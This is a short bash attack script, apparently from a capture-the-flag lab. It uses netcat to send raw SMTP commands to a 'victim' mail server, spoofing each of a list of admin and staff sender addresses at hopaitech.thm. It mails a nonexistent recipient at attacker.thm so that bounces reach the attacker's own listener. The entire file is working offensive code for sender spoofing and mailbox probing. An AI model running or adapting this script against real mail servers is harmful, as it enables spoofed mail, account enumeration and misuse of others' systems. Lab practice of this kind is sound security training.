#!/bin/bash

# Target SMTP server (the real one on the victim machine)
SMTP_SERVER="10.64.188.7"
PORT="25"

# Non-existent recipient on your domain (to force bounce)
BAD_RCPT="this-user-definitely-does-not-exist-12345@attacker.thm"

# List of sender addresses to try (the bunny ones from the homepage)
SENDERS=(
    "root@hopaitech.thm"
    "admin@hopaitech.thm"
    "administrator@hopaitech.thm"
    "webadmin@hopaitech.thm"
    "sysadmin@hopaitech.thm"
    "netadmin@hopaitech.thm"
    "guest@hopaitech.thm"
    "user@hopaitech.thm"
    "web@hopaitech.thm"
    "sir.carrotbane@hopaitech.thm"
    "shadow.whiskers@hopaitech.thm"
    "obsidian.fluff@hopaitech.thm"
    "nyx.nibbles@hopaitech.thm"
    "midnight.hop@hopaitech.thm"
    "crimson.ears@hopaitech.thm"
    "violet.thumper@hopaitech.thm"
    "grim.bounce@hopaitech.thm"
)

echo "Starting bounce attempts against $SMTP_SERVER..."

for SENDER in "${SENDERS[@]}"; do
    echo "[*] Trying MAIL FROM:<$SENDER>"

    # Use a heredoc to feed commands to nc (netcat)
    # Sleeps added to give the server time to respond between commands
    (
        sleep 2
        echo "HELO attacker.thm"
        sleep 1
        echo "MAIL FROM:<$SENDER>"
        sleep 1
        echo "RCPT TO:<$BAD_RCPT>"
        sleep 1
        echo "DATA"
        sleep 1
        echo "Subject: Bounce test - $(date)"
        echo ""
        echo "This is an automated bounce test for $SENDER"
        echo "."
        sleep 1
        echo "QUIT"
    ) | nc "$SMTP_SERVER" "$PORT"

    echo "[+] Done with $SENDER — check your Python mail server for bounces!"
    echo "----------------------------------------"
    sleep 3
done

echo "All attempts completed. Monitor your mail server logs/inbox for incoming bounces."